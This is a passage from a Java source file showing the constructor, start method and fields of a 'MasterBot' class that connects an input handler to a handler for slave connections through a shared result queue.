     * handling user inputs; linking the {@link ConnHandler} and the    
     * {@link InputHandler}
     * 
     * @param args command line arguments received.
     * @throws Exception, if there is a failure in creating {@link ConnHandler}/
     *  {@link InputHandler}
     */
    MasterBot(String[] args) {
        try {
            Queue<String> resultQueue = new ConcurrentLinkedQueue<String>();
            m_connHandler = new ConnHandler(resultQueue);
            m_inputHandler = new InputHandler(args, m_connHandler, resultQueue);
        } catch (Exception e) {
            throw (e);
        }
    }

    /**
     * Starts the MasterBot pipeline.Receives user inputs, and handles
     * slave connections
     */
    private void start() {
        m_inputHandler.start();
    }

    /** Handler for managing slave connections */
    private ConnHandler m_connHandler;

    /** Handler for managing user inputs */
    private InputHandler m_inputHandler;

}